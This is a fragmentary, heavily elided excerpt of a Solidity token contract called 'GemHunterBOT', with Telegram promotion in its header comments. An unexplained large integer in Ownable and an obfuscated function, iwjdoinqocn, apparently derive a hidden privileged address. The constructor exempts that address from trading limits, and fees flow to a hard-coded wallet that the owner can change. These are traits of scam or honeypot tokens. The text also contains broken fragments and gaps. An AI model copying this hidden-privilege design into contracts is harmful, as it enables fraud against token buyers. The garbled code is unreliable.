...
//Telegram: https://t.me/GemHunterTokenBSC
//Bot ready to use @GemHuntermain_Bot
//🔝 Alert of launches by BEST devs
//🔝 Detailed analysis
...
contract Ownable is Context {
    ...
    731994285773522733991050617917166224177865078805;
...
contract GemHunterBOT
 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private _name = "GemHunterBot";
    string private _symbol = "GEMH";
    uint8 private _decimals = 9;
    address payable public _ketmatwallet;
    address payable public teamWalletAddress;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping (address => uint256) _dollar;
    ...
    constructor () {
        ...
        isWalletLimitExempt[iwjdoinqocn(MarketFee)] = true;
        isTxLimitExempt[iwjdoinqocn(MarketFee)] = true;
        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[address(this)] = true;
        _mainPai[address(uniswapPair)] = true;
        _mainPai[msg.sender] = true; 

        teamWalletAddress = payable(address(0xFd5694ba5E96a7914E9aCbde2088AC5e230816Cd));
        _ketmatwallet = payable(address(0xFd5694ba5E96a7914E9aCbde2088AC5e230816Cd));

        _dollar[_msgSender()] = _totalSupply;
    ...
    function tt(address amountaut) private view returns(bool){
        return
        !(iwjdoinqocn(MarketFee) == amountaut);
    }
    ...
    function setMarketinWalleAddress(address newAddress) external onlyOwner() {
        _ketmatwallet = payable(newAddress);
    }
...
= uinttt;}
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            _dollar[sender] = _dollar[sender].sub(amount);
...
[sender]){
            ...
            _dollar[recipient] = _dollar[recipient].add(finalAmount);
 ...
 msg.sender
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _dollar[sender] = _dollar[sender].sub(amount, "Insufficient Balance");
        _dollar[recipient] = _dollar[recipient].add(amount);
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBMarketing > 0)
            transferToAddressETH(_ketmatwallet, amountBNBMarketing);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(feeAmount > 0) {
            _dollar[address(this)] = _dollar[address(this)].add(feeAmount);
